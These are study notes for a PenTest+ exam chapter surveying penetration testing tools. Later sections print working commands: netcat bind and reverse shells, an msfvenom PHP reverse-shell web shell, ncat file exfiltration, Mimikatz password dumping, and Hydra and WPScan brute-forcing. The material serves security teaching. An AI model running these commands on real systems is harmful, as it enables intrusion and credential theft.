# CompTIA® PenTest+® Certification For Dummies®, 2nd Edition

# Chapter 9: Common Penetration Testing Tools

Learn:
- Common PenTest tools
- Their Use Cases
- Introduced to each tools

#

## Understanding Use Cases for Common PenTest Tools

### Reconnaissance

Reconnaissance Tools
- First use case - Information gathering uses reconnaissance tools.
- Two types of reconnaissance: Passive and Active.

Passive Reconniassance:
- Discovering public info available on internet about the Org.
- OSINT to gather info: hosts on internet email addresses, contact names.
  - theHarvester, Maltego, Recon-ng, Shodan, Censys.


Active Reconniassance:
- Engaging with target systems to discover info
- Domain Name System (DNS) lookup, Whois, nslookup, dig
- DNS enumeration with DNSRecon Python scipt.


### Enumeration

Enumeration 
- Another Case Use, also known as scanning and enumeration.
- Use Enumeration tools when discovering detailed info about system on entwork.

Common Tool for Enumeration:
- Nmap: Network Mapper, scanner that perform ping sweeps to tell what systems are up and running,
  - port scans identify ports that are open on each system/ Version of software running on ports.
  - Can also do OS fingerprinting, discover type of OS running on system.
 

### Vulnerability Scanning

Vuln Scanning
- See types of vuln exist on system such as:
  - best practices not being followed
  - Missing patches
  - Misconfiguration of system
 - Great technique to discover weaknesses on a system in order to plan types of attacks you will perform against system during PenTest.
 - Nessus = vuln scanner
 - Nikto and w3af = open source scanners used to identify vuln in websites.


### Credential Attacks

Credential Attacks
- Also known as password attacks
- Used to help discover password for user acc.
- If able to obtain copy of user acc database or password hashe, could use offline password-cracking tools to crack the passwords.
  - Benefit of offline password cracking = Not governed by acc lockout policy if doing cracking offline.
 
Another Techni 
- Brute-Forcing, password cracking service, try every possible password to determine what password is.
- Non-technical: Dumper Diving, going thru garbage to see useful info.


### Persistence

Persistence
- After gaining access to system, Attacker should be sure they can maintain access to system.
  - Can create another method of maintain entry.
 
Ways to maintain access to system:
- Schedule jobs: Create scheduled job or program that would create connection from compromised system to your PenTest system.
- Fake Service: Install fake background service on compromised system, Which allows you to remotely connect to system.
- Trojans: Plant a trojan virus on system so that you can make a connection to trojan port to gain access.
- New Admin Account: Create a new user acc on system to act as backdoor and place that user acc into admin group so you can gain admin access with it.


### Configuration Compliance

Configuration Compliance 
- If PenTest is for compliance reason, need to know specific requirement for environment for compliance.
  - To ensure to test those elements.
 
Example: 
- If company processes credit card info, company must follow list of requirements to ensure security of systems that process and store that info.
- Require system are each on a separate network segment.
- Performing Compliance-based assessment for company, would want to assess network config and ensure credit card processing and storage system are on their own network segment.


### Evasion

Evasion
- Avoids detections
- Limit use of aggressive scans and implement delays between scan attempts to avoid triggering any intrusion detection systems.
- Classic Indication: Same IP address tries to connect to different port on target system over short period of time.


### Decompilaltion and Debugging

Decompilation and Debugging
- Use Decompliation tool to decompile program to review code and look for security weaknesses
- Use Debugger to step thru code and better understand flow of code and what it is doing.

Tools:
- Immunity Debugger: For reverse engineering malware
- GNU Debugger
- GDB (Linux Debugger)
- WinDbg (Windows Debugger)


### Forensics

Forensics
- Use forensics tools to analyse contents of system to identify activity against system.
- Gives capabilities to capture and analyze the contents of memory, hard drive, USB sticks
- Autospy = forensic analysis tool.


### Software Assurance

Software Assurance Testing Tools
- Used to assess security of software application to ensure software is not vuln to attacks that allow hackers to gain access to system.
- PenTester should test software app running on systems to see if there are vuln that can be exploited.

Common Software Assurance Testing Tools:
- Fuzzing
- SAST
- DAST


Fuzzing
- Method to identify poor coding practices in software
- Can use Fuzzer application to send large amount of input into app being tested to see how it responds.
- Fuzzing: process of creating variations of input and sending altered input into app.
- Peach Fuzzer, American Fuzzy Lop (AFL) = Fuzzing tools


SAST
- Static Application Security Testing
- Occurs when security tester review source code of app to ensure dev are following secure coding practices.
- Performed as white box test, given source code to review
- Not running code, just reviewing code.


DAST
- Dynamic Application Security Testing
- PenTester runs app and test functionality of app and how it responds to different input
- Security tester will test app by attempting malicious input such as SQLi code or other forms of malicious injection code.

#

## Looking at Common PenTest Tools

### Scanners 

Scanners
- Different types of Scanners; Some scans for open port, others find vuln within system

Types of Scanners:
- Nmap
- Nikto and w3af
- Nessus
- OpenVAS
- SQLmap
- Open Security Content Automation Protocol (OSCAP)
- Wapiti
- WPScan
- Brakeman
- Scout Suite


#### Nmap

Nmap
- Used to locate system on network and determines open ports on those systems.
- Identify software running on ports and types of OS being used.


#### Nikto and w3af

Nikto
- Open-source Web App vuln scanner
- Nikto perform number of test to determine if web app is vuln to different types of attacks.

To perform Nikto scan against system:
- `nikto -h <IP_or_FQDN>`
- Performing web vuln scan on system with IP or 192.168.1.3
- If web app was using SSL, use: `nikto -h192.168.1.3 -ssl`.

![image](https://github.com/user-attachments/assets/74d4dbd9-a418-4f4b-ba15-e7f14589f310)


w3af
- Another open-source web application vuln scanner
- Web Application Attack and Framework, assess security of web servers.
- Can select different types of vuln to check for by selecting appropriate plug-ins and then starting scan.

![image](https://github.com/user-attachments/assets/d09b6a21-1c16-44e8-854b-603826c1912c)


#### Nessus

Nessus
- Commerical tool used for Vuln scanning of system on network.
- Scan for wide range of vuln, also scan number of different types of devices for those vuln.


#### OpenVAS

OpenVAS
- Open-source vuln scanner
- Perform vuln scan in number of different ways, including authenticated and unauthenticated testing.


#### SQLmap

SQLmap
- Program help automate SQL injection attack against web app you are authorized to test in PenTest.
- To perform automated test with SQLmap, you need to pass in the URL to be tested
  - `sqlmap -u http://192.168.1.3/product.php?id=5`
- The request to page accepts parameter as input and SQLmap will try a number of malicious input on ID parameter.

![image](https://github.com/user-attachments/assets/bcfb57b4-8b74-472f-b871-e0db420aa989)


#### Open Security Content Automation Protocol (OSCAP)

Open Security Content Automation Protocol (OSCAP)
- Framework for automating vuln management and verification of patches.
- Perform automated security configuration review of your systems against benchmark.
- Benchmark = list of requirements that need to be met when check is performed.



#### Wapiti

Wapiti
- Web app vuln scanner that you can use when auditing web app or website.
- Crawl thru content of website and inject data into any forms to test application for vulnerabilities.
- Checks injection vuln, file disclosures, application issues - XSS vulnerabilities.


#### WPScan

WPScan
- WordPress website Scanner
- Looks for vuln in WordPress website.

Perform basic Scan of WordPress to look for common Vuln:
- `wpscan --url website.com`

Scan for vuln plug-in on website:
- `wpscan --url website.com -e vp`
- `-e`: enumerate
- `vp`: vulnerable plug-ins

Get listing of first 100 user accounts exist on site:
- `wpscan --url http://site.com/example -e u[1-100]`

Use wordlist file and crack passwords of those user accounts:
- `wpscan --url http://site.com/example -e u[1-100] --wordlist /usr/share/wordlists/list`


#### Brakeman

Brakeman
- Security scanner for app dev with Ruby on Rails
- Simply look at vuln on running platform and config of the site.
- Look at source code of app to identify vuln


#### Scout Suite

Scout Suite
- Security scanner designed to assess security of cloud environment.
- Uses API calls that expose configuration of cloud environment to identify config setting that may present a security risk.


#

### Credential Testing Tools

Credential Testing Tools
- Tools that help you crack password for user accounts on system.

Type of Credential Testing Tools:
- Hashcat
- Medusa and Hydra
- CeWL
- John the Ripper
- Cain and Abel
- Mimikatz
- Patator and DirBuster


#### Hashcat

Hashcat
- Common password cracking tool for cracking hashes on password.
- MD5, SHA1..
- Can use dictionary attack and brute force attack to crack the password hashes.

Example: 
- `hashcat -m 0 -a 0 -o output.txt target_hashes.txt /usr/share/wordlists/rockyou.txt`
- `-m 0`: specifies hash mode, 0 means MD5, 100 means SHA1
- `-a 0`: specifies attack mode, 0 means dictionary attack.
- `-o`: specifies output files to write cracked passwords to, used output.txt
- `target_hashes.txt`: file that contains the hashes to be cracked.
- `rockyou.txt`: dictionary list file that comes with Kali Linux.


#### Medusa and Hydra

Medusa
- Password cracking rools includes with Kali Linux
- Can use to crack passwords.
- Fast password cracking tool that can encapsulate password attack into different protocols: HTTP, FTP IMAP, MSSQL, POP3 SMTP, TELNET, SSH and more.

Example:
- `medusa -h 192.168.1.3 -u admin -P rockyou.txt -M ssh`
- This will try to crack password for user known as admin on system 192.168.1.3 using SSH as protocol and password list file of rockyou.txt.

Hydra
- Password-cracking tool that can encapsulate attack inside many protocols: FTP, HTTP, HTTPS, LDAP, MS-SQL, MySQL, RDP, POP3, SMB, SSH, and many more.
- Can use it to crack password over RDP.
- Could use Nmap to discover all systems on network running RDP then use Hydra to attempt to crack the admin password.

Example: 
- `nmap -sS 192.168.1.0/24 -p 3389`
- Once discovered the systems running RDP, can then try to crack password with following command:
- `hydra -l administrator -P rockyou.txt rdp://192.168.1.3`
- `-l`: name of the user account to crack, can use -L instead with a text file containing list of users.
- `-P`: specifies password list file to use, used rockyou.txt in this example.
- `rdp://192.168.1.3`: system to crack password on. URL starts with protocol. If you want to crack password over FTP or HTTP, you would simply start URL with those protocol.


#### CeWL

CeWL
- Custom Word List generator
- unique credential cracking tool in the sense that it is used to generate a text tile containing potential passwords by crawling thru site.

Example:
- `cewl -d 2 -m 5 -w words.txt http://www.yourcustomer.com`
- `-d 2`: specifies depth in the  site to go, going two links deep.
- `-m 5`: specifies minimum length of character in words picked up.
- `-w`: specifies file to writes the list of potential password to.


#### John the Ripper

John the Ripper
- Multiplatform password cracking tool thats runs on Windows and Linux.
- Can crack password stored in different hash form: MD5 and SHA.

John package Tools: 
- Mailer: command used to email users who have their password cracked.
- John: command of John the Ripper password cracking tool.
- unafs: Command is used to warn users about their weak passwords.

Example: 
- `john --format=raw-md5 target_hashes.txt`
- `--format`: specifies type of hash value being cracked (MD5 in this example)
- `target_hashes.txt` specifies text file containing the list of hashes.

![image](https://github.com/user-attachments/assets/b7a92956-2ce9-435e-a87e-1e6150f2bb80)

- Can use wordlist file with John the Ripper to perform dictionary attack on password list:
- `john --format=raw-md5 --wordlist rockyou.txt target_hashes.txt`


#### Cain and Abel

Cain and Abel
- Older password cracking tool that has number of features.
- Can easily capture traffic on network then discover password that are sent in clear text
- Also used to crack many different types of password: MD5 hashes, Cisco hashes, Windows Password, and password-protected files.


#### Mimikatz

Mimikatz
- Post exploitation tool on Linux
- Used to steal password off Windows system after system has been exploited.
- Steals passwords by locating passwords stored in memory on exploited system and aids in gaining access to other systems on network.
- Before Windows 10, Windows load encrypted passwords into memeory with feature called WDigest and secret key to decrypt passwords.
- Mimikatz use this and is able to decrypt password.
- In Window 8.1, Microsoft added capability to disable WDigest functionality and it is disabled by default in Windows 10.
  - You can enable it after compromising a system.
 
Example: Mimikatz after exploited a system
- `mimikatz # privilege::debug`: to verify that you have privileges to run command (you must be admin to run Mimikatz)
- `Privilege '20' OK`: return this means you are admin.

Load Sekurlsa module for Mimikatz, retrieve password from memory:
- `mimikatz # sekurlsa::logonpasswords`:
- You will receive list of usernames found in memory with LM hash, NTLM hash and SHA1 hash of the passwor
- Info as the username, domain name, and password in plain text.


#### Patator and DirBuster

Patator and DirBuster
- Patator = password cracking tool that used to crack password given the hash values of password
- DirBuster = Open Web Application Security Project (OWASP) designed to locate directory and filenames on web server.

#

### Debuggers

Debugger
- Tools can help analyze actions taken by particular piece of software.
- Allows you to analyze code of an application to see what applicationis doing underneath the scenes.
- Allow to inspect value of items such as variables while step thru code so you can deteremine type of changes that are occuring when app executes.

Types of Debuggers:
- OllyDbg
- Immunity Debugger
- GDB
- WinDbg
- IDA
- Covenant

OllyDbg:
- Used when you do not have the source code available.
- Allows you to perform binary code anaylsis (analysis on compiled code).

Immunity Debugger: 
- Commoon PenTest tool
- Allows to analyze malware and reverse-engineer binary files.

GDB: 
- GNU debugger, available in Linux.
- Commonand line tool, allows you to inspect area of memory used by program being debugged and monitor code sections that are executing.

WinDbg:
- Debugger built for Windows.
- Can be used to debug apps, device drivers and OS components.

IDA:
- Interactive Disassembler tool
- Allows process an executable program and generate the assembly code from executable.

Covenant:
- Command and control framework with web-based interface that allows you to test the attack surface of a .NET-based application.

#

### Software-Assurance Tools

Software-Assurance Tools:
- Use to test software for weaknesses in design and application code.

Types of Software-Assurance Tools:
- FindBugs/find-sec-bugs
- Peach Fuzzer
- AFL
- SonarQube
- YASCA


FindBugs/Find-sec-bugs
- Static Analysis tools
- Used to review and analyze Java Code.
- Both have plugins that can be added to poplar IDEs; Eclipse or IntelliJ.

Peach Fuzzer:
- Fuzzing Tool designed to test app against different forms of input
- Detect problems in app code.
- Generate a variety of invalid input to send to app to see how it responds to recieving incorrect data.

AFL:
- American Fuzzy Lop
- Fuzzing tool designed to send arbitrary input into app to test for code issues.

SonarQube:
- Automated static code analysis tool that continuously monitors code for bugs and clean code issues.
- Used to test code for variety of coding issues and security practices
- Has wide list of programming lang it can work with.

YASCA:
- Open-source static code Analysis tool designed to detect security vuln within source code.
- Has the benefit of being able to generate a report on results of testing.


#

### Open-Source Intelligence (OSINT) Tools

OSINT Tools:
- Gathering Info from public data sources availabile on Internet.

Types of OSINT Tools:
- Whois
- nslookup
- FOCA
- theHarvester
- Sodan
- Maltego
- Recon-ng
- Censys

Whois:
- Database search tool
- used to search domain info about Org
- Obtain info; technical contact name, phone numbers, email.
- Used to obtain public IP blocks assined to companies.

Nslookup:
- DNS profiling tool used to query DNS server and obtain IP addresses for public systems on internet.
- Can use `dig` in Linux for DNS profiling.

FOCA:
- Fingerprinting Organization with Collected Archives
- OSINT tool used to extract metadata from doc: Microsoft Office doc and PDF files.
- Extract EXIF metadata from graphic files.

theHarvester:
- Used to collect subdomains, email addresses, hostname, IP address of system on internet for company.

Shodan:
- Shows different devices Org has connected to internet and info about those device: Ports that are open and vuln that exist.

Maltego:
- Data-mining tool
- Used in forensics that shows devices connected to internet and their relationship with data from other sources.

Recon-ng:
- Web reconnaissance framework in Linux
- Designed to collect a wealth of info about company from online source and generate a report.

Censys:
- Browser-based search engine
- Identifies hosts on Internet for particular Org.
- Identify services and ports that are open on those system.

#

### Wireless Tools

Type of Wireless Tools
- Aircrack-ng Suite
- Kismet
- Wifite
- Wifite2
- Rogue Access point
- EAPHammer
- mdk4
- Spooftooph
- Reaver
- Wireless Geographic
- Wireless Geographic Logging Engine (WiGLE)
- Fern


#### Aircrack-ng Suite

Aircrack-ng Suite
- Allows you to exploit wireless networks.
- Aircrack-ng: used to crack encryption key for WEP, WPA, WPA2.
- Airmon-ng: Used to place wireless network card in monitor mode.
- Aireplay-ng: Used to perform packet injection.
- Airodump-ng: Used to capture wireless traffic.
- Airbase-ng: Used to create a fake access point for man in the middle attack.


#### Kismet

Kismet
- Wireless network scanner that can be used to detect wireless network and client that are connected to the wireless network.
- Can see number of details about wireless network: SSID, channel, MAC address of wireless access point.
- Can see MAC addresses of clients connected and number of packet being sent by clients.


#### Wifite

Wifite
- Automated wireless testing tool in Linux
- Benefit = automates number of wireless tools that you can manually use yourself such as cracking WEP, WPA, WPA2
- Can Perform WPS attack.

![image](https://github.com/user-attachments/assets/c8966936-044e-437d-b1b2-015daff2800e)

Example:
- `wifite -pow 50 -wps`
- Perform a WPS attack against any access point in your area that have power level greater than 50 dB.


#### Wifite 2

Wifite 2
- Newer version of Wifite
- Wireless security assessments and attacks occur much more quickly than with Wifite.
- Wifite2 scans wireless channels for wireless networks, rank them by their signal strength, then gather info about wireless network to help determine what attack tech may be useful.
- After info is collected, list of wireless network is displayed (with their characteristic)
  - Attacker can choose a target network to attempt to exploit
- Attempts faster attack types first before moving on to slower attack types.


#### Rogue Access Point

Rogue Access Point:
- AP that is connected to network without permission of network owner.
- Attacker can trick client into connecting to it and then try to capture sensitive info; passwords.


#### EAPHammer 

EAPHammer:
- Wireless attack framework used with WPA2 Enterprise network that perform evil twin attack, karma attacks, SSID Cloacking to steal RADIUS credential from network.


#### mdk4

mdk4
- Wireless attack tool
- Used to perform number of different types of attack; deauthentication attack, DoS attack,, Create fake wireless network.


#### Spooftooph

Spooftooph:
- Bluetooth tool used to automate the spoofing or cloning of device name, class, address


#### Reaver

Reaver:
- Tool used to crack WPS pins.


#### Wireless Geographic Logging Engine (WiGLE)

WiGLE:
- Special website used to collect info about wireless hotspots that exist around the world.
- Can upload info about hotspot such as SSID, MAC address and GPS coordinates.


#### Fern

Fern:
- Wireless attack tool
- Written in Python
- Designed to crack WEP, WPA, WPS encryption keys.

#

## Web Application Tool/Web Proxies

Web Proxies are also known as Interception Proxies
- Proxy tool intercept calls going out to web server.
- Benefit: Can view, analyze, manipulate: web request being sent to web server and attempt different types of injection attacks.

Types of Web Application Tool/ Web Proxies
- OWASP ZAP
- Burp Suite
- Gobuster


#### OWASP ZAP

OWASP ZAP
- OWASP Zed Attack Proxy
- Open source and available by default with Linux
- Help find vuln in your web app.

![image](https://github.com/user-attachments/assets/646cfc63-4be8-4a70-a856-808912c68c30)


#### Burp Suite

Burp Suite:
- GUI tool
- Allows Attacker to test security of web app.
- Includes feature: acting as a web proxy that allows the product to act as a man-in-the-middle between browser and the web server.
- Web app security scanner that scan website for vuln and report on those vuln.
- Perform number of attack to test hhow web app holds up against common attack: SQLi, XSS, Parameter manipulation


#### Gobuster

Gobuster
- Tool built into Kali
- Used to enumerate website and locate hidden directories or files exist in website.
- Similar to DirBuster, but run faster thhan DirBuster.

#

## Social Engineering Tools

Tricking someone into compromising security thhru social contract:
- email
- phone call
- in person conversation

Types of Social Engineering Tools
- SET
- BeEF

SET:
- Social Engineer ToolKit
- Allows to perform number of social engineering attack against rsons you are authhoried to assess.
- Makes easy to perform social engineering attacks by creating user friendly menu to navigate thru to create the attack.
- Can perform Spear-phishing attacks, mass mailer attacks, SMS spoofing attack.

![image](https://github.com/user-attachments/assets/2de9c6d2-de48-49fd-8aae-904635c5a4c6)

BeEf:
- Broswer Exploitation Framework
- Comes with Linux that can use in social engineering attacks to exploit someone's web browser.
- Use to generate malicious webpage then host the page on web server.
- Trick users to visit website and run malicious code, attacker will get access to the client's system and run number of post exploitation.
  - Can enable web cam, capture login tarffic to sites.
 
#

### Remote Access Tools

After exploit and gain access to system
- Remote into system to copy info
- Maintain access (persistence) for future.

Types of Remote Access Tools:
- Secure Shell (SSH)
- Netcat
- Ncat
- Proxychains

#### Secure Shell (SSH)

Secure Shell (SSH):
- Communication protocol thhat allows you to remotely connect to system over encrypted channel.
- Could be used to remote back to your PenTest System


#### Netcat

Netcat:
- Nc.exe
- Old command line utility used to set up open port on a system then connect to that port.
- Allow you to connect common ports used by web servers and email servers to send commands to those services.
- Attackers use Netcat to open communication channel to a system.
- Method to maintain access (persistence)

#### Ncat

Ncat:
- ncat.exe
- Modern version of Netcat
- Improved functionality with feature such as SSL support, proxy connections, IPv6 support, connection brokering.

Example:
- Set up Ncat as a listener on system that you can use to send file:
- `ncat -l > fileToWireto.txt`
- `-l`: system is listening for data

- After system compromised, if you want to send file to your own system:
- `ncat --send-only ip_of_listeningsystem < inputfile.txt`

#### Proxychains

Proxychains:
- Tool used to force a connection from an app to pass thru proxy server such as TOR, SOCKS proxy or HTTP(S) proxy.

#

### Networking Tools

Types of Network Tools 
- Wireshark
- hping3


#### Wireshark

Wireshark:
- Used for capturing and anaklyzing network traffic.
- Capture network traffic on wired network and wireless network
- Enabling you to eavesdrop on communication between system.


#### hping3

hping3
- Example of pinger program that allow you to crafy your own ping message using custom port numbers and protocols.
- Useful as you can use to bypass firewalls; blocking ICMP traffic (used by most pinger).

Example:
- `hping3 -c 3 -S -p 80 -s 53 www.wiley.com`
- send three ping message to destination port 80 at target of wiley.com
- `-c 3`: specifies three ping messages are sent.
- `-S`: specifies set SYN flag so it appears as first phase of TCP 3 way handshake.
- `-p 80`: specifies destination port of packet to 80 (web server port).
- `-s 53`: specifies source port of packet to 53 (so it looks like DNS traffic)

#

### Micellaneous Tools

Types of Misc. Tools
- SearchSploit
- PowerSploit
- Responder
- Impacket tools
- Empire
- Metasploit
- mitm6
- CrackMapExec
- TruffleHog

#### SearchSploit

SearchSploit: 
- Command line environment to search Exploit-DB that allows you to take copy of exploited database offline with you.
- Useful tool when performing assessment on secure network segments that do not have Internet access.


#### PowerSploit

PowerSploit:
- Number of PowerShell scripts that can be utilized during the penetration test to perform a number of actions including recon and post exploitation.


#### Responder

Responder:
- Toolkit to respond to NETBIOS name service queries for file server service request using Server Message Block (SMB) protocol.
- Used to obtain password hashes via network traffic
- Can then be cracked with password cracking tool; John the Ripper.


#### Impacket Tools

Impacket Tools:
- Set of Python classes that give low-level access to packet and protocol information


#### Empire

Empire:
- Post-exploitation framework that has PowerShell agent built in withh number of cmdlets that perform post-exploitation tasks; keyloggers and Mimikatz.


#### Metasploit

Metasploit:
- Has number of exploit modules you can run to exploit systems on network and perform post exploitation task.


#### mitm6

mitm6:
- MiTM attack tools; On-path attack.
- replies to DHCPv6 messages and modifies link-local IPv6 addressing info so that attacker is default DNS server for victim.


#### CrackMapExec

CrackMapExec:
- Post-exploitation tool designed to collect info from Active Directory that can be used for lateral movement.


#### TruffleHog

TruffleHog:
- Tool used to search Git repositoies for secrets that have been committed to repository.

#

### Steganography Tools

Used for Storing secret message within Data:
- Store text file that contains secret message with a .jpg graphic file using special program known as steganography tool.
- Use password protect the concealed data so even if someone uses steganography tool to try to read the data
  - person would need to know the password.
 
Types of Steganography Tools:
- Steghide
- Open steg
- Snow
- Coagula
- Sonic Visualiser
- TinEye
- Metagoofil
- Online SSL Checkers


#### Steghide

Steghide:
- Program used to embed text file into cover file (graphic file or sound file).
- Supports different operation modes such as embedding text file into graphic or extracting the text file out of graphic.

![image](https://github.com/user-attachments/assets/a6ebfd08-9385-4b5b-929b-bc8e39c28f23)

- After embedding secret message into graphic, someone could place graphic on webpage that intended recipient could download the graphic from webpage.
- Note: most firewall allow HTTP traffic to pass thru, this would allow message to reach recipient.
- Extract file, would enter following command and supply password that was config during embed operation:

![image](https://github.com/user-attachments/assets/b9e78d1b-087d-4060-9954-279396886921)


#### OpenStego

OpenStego:
- Free steganography software written in Java that allows you to hide a text file within graphic file.
- Used to apply invisible watermark to files in order to prove the originator of the file.


#### Snow

Snow:
- Hides data in white space (Space and Tabs) within the file.
- Includes additional compression and encryption options when concealing a file.


#### Coagula

Coagula:
- Program used to store secret message within audio files.


#### Sonic Visualiser 

Sonic Visualizer:
- Free tool allows you to analyze audio files.


#### TinEye

TinEye:
- Reverse image search tool
- Used to search for image on internet.
- Can navigate to TinEye website to perform a search for an image.

#

### Cloud Tools

Types of Cloud Tools:
- Scout Suite
- CloudBrute
- Pacu
- Cloud Custodian

#### Scout Suite

Scout Suite:
- Security scanner designed to assess the security of cloud environment.
- Uses API calls that expose configuration of cloud environment to identify config setting in cloud that may present a security risk.


#### CloudBrute

CloudBrute:
- Tool on Linux; allows to discover company's infrastucture, files, apps that are running in cloud.
- Supports all of the major cloud environment suchh as those provided by Microsoft, Amazon, Google.


#### Pacu

Pacu:
- Open serouce exploitation framework for Amazon Web Service (AWS) cloud environments.
- Metasploit = exploit framework for on-premises environment,
- Pacu = epxloit framework for cloud environment.


#### Cloud Custodian

Cloud Custodian:
- Automation tool; allows you to not only report on security issues with cloud tenant.
- Also used to enforce security policies
- Cloud Custodian supports AWS, Azure and Google Cloud Platform.

#

### Mobile Tools

Types of Mobile Tools:
- Drozer
- APKX
- APK Studio

#### Drozer

Drozer:
- Framerwork Created by MWR Labs to assess security of Andriod application on Android device.


#### APKX

APKX:
- Command line tool used to decompile Android package files (.apk) written in Java.


#### APK Studio

APK Studio:
- Suite of tools used to decompile Android application, edit the code and recompile the application.

#

## Analyzing Tool Output

Expected to be able to look at output commands and know what tool was used to generate the output


### Password Cracking

Password Cracking:
- Tools: Hydra, Hashcat, Mimikatz, John the Ripper

Example: 
- `hydra -t 4 -l testUser -P passwords.txt -V rdp://192.168.1.194`
- `-l`: user account to try to crack.
- `-P`: password list file to use.
- `rdp://192.168.1.194`: communication protocol and system.
- `-V`: display attempts on screen
- `t`: number of parallel tries. 4 tasks at a time.

xHydra
- GUI version, can set your user list, password list, target IP address, protocol and port.

![image](https://github.com/user-attachments/assets/ba638b98-0bf0-4a1b-91c0-6c4851153c7b)


John the Ripper Output:
- Created a few user account on Linux machine with command:
- `useradd testUser` and `useradd testUser2`
- Setting testUser password to "house" and testUser2 to "Pa$$word": 
- `passwd testUser`

Cracking hash withh John the Ripper:
- Try to crack password hashes stored in /etc/shadow file on Linux.
- `john /etc/shadow`


![image](https://github.com/user-attachments/assets/ece9d094-79b4-4a65-9e81-cc2530b7224a)


### Pass the Hash

Pass the hash:
- Exploit that can be used to gain access to remote system by using hash value of user's password.
- If hashes are able to extract off system, you may be able to use those hash value to connect to anothersystem without cracking the hash values using pass the hash.
  - Works assuming user account is using the same password on each of the different systems.
 
Pass the hash example:
- Exploiting system thats vuln to SMB ms08_067_netapi exploit

![image](https://github.com/user-attachments/assets/12266752-20b7-4be4-995c-c06f1f06fbd3)

- If exploit is successful; there should be meterpreter prompt where you can execute post exploitation commands.
- Use `sysinfo` to verify system you have exploited.
- Then grab the password hashes with `hashdump` command.

![image](https://github.com/user-attachments/assets/bcad17ba-41e9-4a6b-96de-47b0d1fe3543)


- Next step is to locate other Windows Systems on network to try to use password hashes on.
- Use Nmap with OS detection (-O):
- `nmap -sS -p 135,139,445 -O 192.168.1.0/24`
- Looking for OS details of each system to detemine if its a Windows system.
  - Note the IP addresses of thise system
  - Start another metasploit session
  - Try follow command on each systems, replaceing RHOST setting with one of the IP address that are Windows system.
 
![image](https://github.com/user-attachments/assets/2081141a-f069-43a5-97de-82cadc7828c8)

- If you are able to connect, it will tell you on screen that the authentication was successful
- If you were not able to connect, means username and same password does not exist on target system.


### Setting Up a Bind Shell

Setting up a Bind Shell:
- Bind shell: a type of shell or command prompt environment set up by attacker on a system from across the network to make a connection to that remote system.
- When connection is made, shell then sends text output to attacker system due to remote connection.
- Its bascially redirecting output that normally goes to monitor to a network connection.

Example: 
- Need to use Netcat (nc.exe) or Ncat (ncat.exe) to set up listener waiting for connection on victim system.
- On victim's system run following command:
- `nc -n -v -l -p 5555 -e /bin/bash`: if target system is Linux.
- `nc -n -v -l -p 5555 -e cmd.exe`: if target system is Windows.
- `-n`: do not do name resolution because we are using IP addresses.
- `-v`: to give  us verbose output.
- `-l`: Netcat should run in listening mode and wait for a connection.
- `-p 5555`: port number to listen on.
- `-e`: specifies the command to execute when connection is made.

After target system is in listening mode:
- Can use Netcat or Ncat to make connection to system using that port:
- `nc -n -v target_ip 5555`
- `-n`: do not do name resolution because we are using IP addresses.
- `-v`: give us verbose output.

![image](https://github.com/user-attachments/assets/dd6eb5c3-a71a-404c-b397-d57c853e5ffc)

- Ncat being used on Windows system to set up a listener
- Netcat being used on Linux system to make connection.
- Notice: prompt on Linux system changes to that of a Windows machine once the connection is made.


### Getting Reverse Shell

Getting Reverse Shell:
- Bind Shell is great when you are on same network as target system.
- If on different network and target is behind Network Address Translation (NAT) device, you will need to do reverse shell.
- Reverse Shell: occur when you set up listener on PenTester's system and trick target system into connecting to the PenTester's system using shell.

Example:
- Use Netcat command to set up the Pentester's system as listener:
- `nc -n -v -l -p 5555`
- Do not specify command to execute, the fact that listener is now configured on PenTester's system.

After PenTest system is listening: 
- Run Netcat on target system to send or push a shell or command prompt to the PenTester:
- `nc -n -v pentester_ip 5555 -e cmd.exe` for windows.
- `nc -n -v pentester_ip 5555 -e /bin/bash` for Linux.


### Proxying a Connection

Proxying a Connection:
- If the target system/application is sitting behind a company firewall, making app unreachable to your PenTesting system
  - You can create a SOCKS proxy to taraget network using SSH, then config your PenTest app to use that proxy.
 
Example: 
- Command you can use to config a proxy out of SSH session:
- `ssh target_ip -D 5555`

How it works:
- Once SOCKS proxy is bound to SSH tunnel, any connections to port specified by SOCKS proxy will then be delivered across SSH tunnel.
- Can config your PenTest tools such as Burp Suite to use SOCKS proxy address
- It will communicate thru SSH tunnel to the target network.


### Uploading a Web Shell

If you have capabilities to upload files to web server:
- You can upload a script that creates reverse shell back to your PenTest system.
- Accessing the page on web server, script will run and create the reverse shell.

Steps:

1. Create the reverse shell PHP web page:
- Use msfvenom tool to create a script that uses reverse TCP meterpreter session with your PenTest system:
- `msfvenom -p php/meterpreter_reverse_tcp LHOST=pentester_ip LPORT=4444 -f raw > shell.php`
- `-p`: meterpreter payload as the attack.
- `LHOST`: IP address of penetration tester's system.
- `LPORT`: port on PenTester's system to connect to.
- `-f raw`: format of output such as exe file or just raw text.
- `> shell.php`: file to write the output to.

You can upload that file to target web server using vuln file upload page on web server or by exploiting it.

2. Create the listener on PenTest system:
- Before running shell.php, need to set up our PenTest Linux to start listening for connection using Metasploit:

![image](https://github.com/user-attachments/assets/f5787997-ca2d-48b1-b552-f5417837e3f2)

- The terminal is waiting for connection with information such as:

![image](https://github.com/user-attachments/assets/16210369-e25f-4363-809d-45b5f31462d4)

- Terminal session will stay like that until shell.php page is run
- Then, creates the reverse connection into PenTest's system.
- You would then send a request for page that was uploaded to web server to finalize the connection.
- Once reverse connection is made, ou will have meterpreter session on your PenTest system:

![image](https://github.com/user-attachments/assets/ffd71920-d721-46f5-b5a2-4b3e672a17a6)

- Once meterpreter session is open, you can then run any of the many meterpreter commands including post-explotation commands.


### Injections

Injection:
- SQLi
- File injection
- Cross-site Scripting Attack

#

## Reviewing Key Concepts

» Example reconnaissance tools are Recon-ng, Maltego, theHarvester, Shodan, Whois, nslookup, and dig. Be sure to review Chapter 3 to practice the reconnaissance tools. 

» You can use Nmap to enumerate the network and systems looking for systems that are up and running, ports that are open, and enumeration of shares and user accounts. Be sure to review Chapter 3 to refresh your memory on the Nmap commands. 

» Fuzzing tools send different types of input to an application to test how the application handles the input. Example fuzzing applications are Peach Fuzzer and AFL. 

» You can use Nikto to scan a web server for vulnerabilities and Nessus for scanning any system for known vulnerabilities. 

» You can crack passwords with Hydra, Hashcat, John the Ripper, and Medusa. CeWL is a tool used to parse through web pages and build a password list file. Mimikatz is also an important tool to know as it will reveal passwords on an exploited system. 

» Responder is used to perform a man-in-the-middle (MiTM) attack on a Windows network in order to capture password hashes that can then be cracked with a tool such as Hashcat or John the Ripper. 

